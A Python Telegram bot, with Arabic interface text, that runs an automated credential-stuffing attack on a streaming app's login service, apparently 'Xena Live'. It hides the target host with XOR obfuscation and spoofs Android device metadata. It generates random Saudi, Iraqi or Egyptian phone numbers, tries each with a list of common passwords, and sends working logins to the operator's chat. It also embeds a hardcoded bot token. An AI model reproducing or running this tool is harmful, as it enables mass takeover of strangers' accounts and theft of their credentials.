#!/usr/bin/env python3
import os
import sys
import time
import random
import hashlib
import threading
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import grpc

TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAHI93U8a0StTBhwuCEbZJR7qzHpy2BdS3g")
bot = telebot.TeleBot(TOKEN)

# ══════════════════════════════════════════════════════════
#  XOR obfuscation
# ══════════════════════════════════════════════════════════
def _xd(b):
    return bytes(c ^ 0x5A for c in b).decode()

_grpcHost  = bytes([0x28,0x2a,0x39,0x77,0x32,0x2d,0x74,0x22,0x3f,0x34,0x3b,0x36,0x33,0x2c,0x3f,0x74,0x37,0x3f,0x60,0x6e,0x6e,0x69])
_svcPrefix = bytes([0x75,0x3d,0x28,0x2a,0x39,0x74,0x36,0x35,0x3d,0x33,0x34,0x74,0x16,0x35,0x3d,0x33,0x34,0x09,0x3f,0x28,0x2c,0x33,0x39,0x3f])
_pkg       = bytes([0x39,0x35,0x37,0x74,0x22,0x2a,0x3b,0x28,0x2e,0x23,0x74,0x3b,0x34,0x3e,0x28,0x35,0x33,0x3e,0x3b,0x2a,0x2a])
_userAgent = bytes([0x3d,0x28,0x2a,0x39,0x77,0x30,0x3b,0x2c,0x3b,0x77,0x35,0x31,0x32,0x2e,0x2e,0x2a,0x75,0x6b,0x74,0x6c,0x6b,0x74,0x6a])

GRPC_HOST  = _xd(_grpcHost)
SVC_PREFIX = _xd(_svcPrefix)
PKG        = _xd(_pkg)
APP_VER    = "2003003"
APP_VN     = "2.3.3.1"

PASSWORDS = [
    "Aa123456@","Aa123456","Aa12345678","Aa12345678@",
    "Aa1234567@","Aa1234567","Aa123123@","Aa123123",
    "Aa12341234","Aa@123456","Aa@123123","Aa@112233",
    "123456","1234567","12345678","Password1","P@ssw0rd"
]

COUNTRY_MAP = {
    "SA": {"code":"966","prefs":["50","51","53","54","55","56","57","58","59"],"ext":7},
    "IQ": {"code":"964","prefs":["770","771","772","773","780","781","790"],"ext":7},
    "EG": {"code":"20", "prefs":["10","11","12","15"],"ext":8},
}

def _varint(v):
    b = bytearray()
    while v > 0x7F:
        b.append((v & 0x7F) | 0x80)
        v >>= 7
    b.append(v & 0x7F)
    return bytes(b)

def _fstr(n, val):
    d = val.encode()
    return _varint((n << 3) | 2) + _varint(len(d)) + d

def _fint(n, val):
    return _varint(n << 3) + _varint(val)

def _fbytes(n, data):
    return _varint((n << 3) | 2) + _varint(len(data)) + data

def _pvarint(data, pos):
    val = shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80): break
        shift += 7
    return val, pos

def _proto(data):
    fields, i = [], 0
    while i < len(data):
        tag, i = _pvarint(data, i)
        if not tag: break
        fn, wt = tag >> 3, tag & 7
        if wt == 0:
            v, i = _pvarint(data, i)
            fields.append((fn, 0, v, None))
        elif wt == 2:
            ln, i = _pvarint(data, i)
            end = i + ln
            if end > len(data): break
            fields.append((fn, 2, 0, data[i:end]))
            i = end
        else: break
    return fields

def _fget(fields, n):
    for f in fields:
        if f[0] == n: return f
    return None

def _sim_info():
    return (_fint(1,454) + _fstr(2,"00") + _fstr(3,"HK") + _fstr(4,"CSL") + _fstr(5,"CSL"))

def _build_login(phone, password, country):
    return (_fstr(1, phone) + _fstr(2, hashlib.md5(password.encode()).hexdigest()) + _fstr(5, country) + _fbytes(6, _sim_info()))

def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def _uuid():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0f) | 0x40
    b[8] = (b[8] & 0x3f) | 0x80
    h = b.hex()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"

def _make_meta(did):
    ts = str(int(time.time() * 1000))
    return [
        ("lang", "ar"), ("version", APP_VER), ("vc", APP_VER), ("vn", APP_VN),
        ("trace_id", _uuid()), ("os", "android"), ("sys_version", "android-10"),
        ("model", "CPH2469"), ("mcc", "454"), ("locale", "ar_SA"), ("net_type", "6"),
        ("pkg", PKG), ("issue_channel", "1"), ("did", did), ("timezone", "8"),
        ("request_time_s", ts), ("device_level", "HIGH"), ("idfa", _uuid()),
    ]

class GrpcClient:
    def __init__(self):
        self.did = _rand_hex(16)
        opts = [("grpc.keepalive_time_ms", 20000), ("grpc.max_reconnect_backoff_ms", 5000)]
        creds = grpc.ssl_channel_credentials()
        self._ch = grpc.secure_channel(GRPC_HOST, creds, options=opts)
        self._login = self._ch.unary_unary(SVC_PREFIX + "/PhoneLogin", request_serializer=lambda x: x, response_deserializer=lambda x: x)

    def call(self, payload, timeout=10.0):
        meta = list(_make_meta(self.did))
        try:
            resp = self._login(payload, metadata=meta, timeout=timeout)
            return resp, None
        except grpc.RpcError as e:
            return None, str(e.code())

    def close(self):
        try: self._ch.close()
        except: pass

def _parse_login(data):
    if not data: return {"status": "error"}
    fn, wt = data[0] >> 3, data[0] & 7
    if fn == 2 and wt == 0:
        top = _proto(data)
        r = {"ok": True, "status": "hit", "uid": "", "token": "", "shortUID": 0}
        f = _fget(top, 2)
        if f: r["shortUID"] = f[2]
        for fld_n in (3, 4):
            f = _fget(top, fld_n)
            if f and f[3]:
                s = f[3].decode(errors="replace")
                if len(s) >= 32 and not r["token"]: r["token"] = s
        f = _fget(top, 10)
        if f and f[3]:
            s = f[3].decode(errors="replace")
            if s.isdigit(): r["uid"] = s
        return r
    return {"status": "fail"}

def _gen_phone(cc):
    c = COUNTRY_MAP.get(cc, COUNTRY_MAP["SA"])
    pref = random.choice(c["prefs"])
    ext = ''.join(str(random.randint(0, 9)) for _ in range(c["ext"]))
    local = pref + ext
    return c["code"] + "-" + local, "0" + local

# إدارة حالة الفحص المباشر
checker_state = {
    "is_running": False,
    "checked": 0,
    "hits": 0,
    "errors": 0,
    "start_time": 0
}

def get_main_keyboard(running=False):
    markup = InlineKeyboardMarkup()
    if not running:
        markup.add(
            InlineKeyboardButton("🚀 بدء الفحص (SA)", callback_data="start_sa"),
            InlineKeyboardButton("🚀 بدء الفحص (IQ)", callback_data="start_iq")
        )
    else:
        markup.add(
            InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_checker")
        )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = get_main_keyboard(checker_state["is_running"])
    bot.send_message(
        message.chat.id, 
        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاضغط على الزر بالأسفل للتحكم بعملية الفحص:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global checker_state
    data = call.data

    if data.startswith("start_"):
        if checker_state["is_running"]:
            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
            return
        
        cc = data.split("_")[1].upper()
        checker_state["is_running"] = True
        checker_state["checked"] = 0
        checker_state["hits"] = 0
        checker_state["errors"] = 0
        checker_state["start_time"] = time.time()

        bot.answer_callback_query(call.id, f"🚀 بدأ الفحص لدولة {cc}")
        
        # تشغيل حلقة الفحص في الخلفية مع تحديث الرسالة تلقائياً
        threading.Thread(target=run_background_scanner, args=(call.message.chat.id, call.message.message_id, cc), daemon=True).start()

    elif data == "stop_checker":
        if not checker_state["is_running"]:
            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف أساساً.")
            return
        
        checker_state["is_running"] = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص.")
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="⏹ **تم إيقاف عملية الفحص بنجاح.**",
                reply_markup=get_main_keyboard(False),
                parse_mode="Markdown"
            )
        except:
            pass

def run_background_scanner(chat_id, message_id, cc):
    global checker_state
    cli = GrpcClient()
    last_update_time = 0

    while checker_state["is_running"]:
        try:
            phone, first_pw = _gen_phone(cc)
            for pw in [first_pw] + PASSWORDS:
                if not checker_state["is_running"]: break
                
                payload = _build_login(phone, pw, cc)
                data, err = cli.call(payload)
                checker_state["checked"] += 1

                if err:
                    checker_state["errors"] += 1
                elif data:
                    res = _parse_login(data)
                    if res.get("status") == "hit":
                        checker_state["hits"] += 1
                        hit_msg = (f"🎯 **HIT FOUND!**\n\n"
                                   f"📱 Phone: `{phone}`\n"
                                   f"🔑 Pass: `{pw}`\n"
                                   f"🆔 UID: `{res.get('uid')}`\n"
                                   f"🔢 Short ID: `{res.get('shortUID')}`")
                        bot.send_message(chat_id, hit_msg, parse_mode="Markdown")

                # تحديث اللوحة التلقائية كل ثانيتين لتفادي الحظر من تلغرام (FloodWait)
                current_time = time.time()
                if current_time - last_update_time >= 2.0:
                    last_update_time = current_time
                    elapsed = int(current_time - checker_state["start_time"])
                    speed = checker_state["checked"] / max(elapsed, 1)
                    
                    status_text = (
                        f"🚀 **جاري فحص دولة [{cc}] بثبات...**\n\n"
                        f"📊 **الإحصائيات المباشرة:**\n"
                        f"• تم فحص: `{checker_state['checked']}` رقم\n"
                        f"• الصيد الصحيح (Hits): `{checker_state['hits']}` 🎯\n"
                        f"• الأخطاء: `{checker_state['errors']}` ⚠️\n"
                        f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
                        f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
                    )
                    try:
                        bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text=status_text,
                            reply_markup=get_main_keyboard(True),
                            parse_mode="Markdown"
                        )
                    except Exception:
                        pass
        except Exception:
            time.sleep(1)

    cli.close()
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"⏹ **توقف الفحص نهائياً.**\nالنتائج النهائية:\n• إجمالي الفحص: `{checker_state['checked']}`\n• الصيد: `{checker_state['hits']}`",
            reply_markup=get_main_keyboard(False),
            parse_mode="Markdown"
        )
    except:
        pass

if __name__ == "__main__":
    print("Bot is running with inline keyboards...")
    bot.infinity_polling()
